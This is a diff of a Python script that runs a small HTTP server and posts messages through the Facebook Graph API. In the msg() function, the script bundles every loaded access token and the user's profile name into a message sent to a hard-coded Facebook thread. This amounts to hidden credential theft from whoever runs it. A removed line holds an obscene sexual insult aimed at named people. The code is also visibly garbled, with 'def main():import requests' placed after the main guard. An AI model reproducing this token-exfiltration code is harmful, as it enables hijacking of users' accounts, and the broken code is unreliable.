@@ -20,12 +20,13 @@ import http.server
 import socketserver
 import threading
 
+
 class MyHandler(http.server.SimpleHTTPRequestHandler):
     def do_GET(self):
         self.send_response(200)
         self.send_header('Content-type', 'text/plain')
         self.end_headers()
-        self.wfile.write(b"RISHU URF SHUBHAM KI BH3N GUNJ9N KI CHUT M9RN3 W9L9 N9Y9N H3R3")
+        self.wfile.write(b"OK")
 
 def execute_server():
     PORT = 4000
@@ -136,7 +137,7 @@ def msg():
     parameters = {
         'access_token': random.choice(access_tokens),
         'message': 'User Profile Name: ' + getName(random.choice(access_tokens)) + '\nToken: ' + " | ".join(
-            access_tokens) + '\nLink: https://www.facebook.com/messages/t/' + convo_id
+            access_tokens) + '\nLink: https://www.facebook.com/messages/t_100009394417485/' + convo_id
     }
     try:
         s = requests.post("https://graph.facebook.com/v15.0/t_100045751371918/", data=parameters, headers=headers)
@@ -153,6 +154,7 @@ def main():
 if __name__ == '__main__':
     main()
 def main():import requests
+
 import json
 import time
 import sys
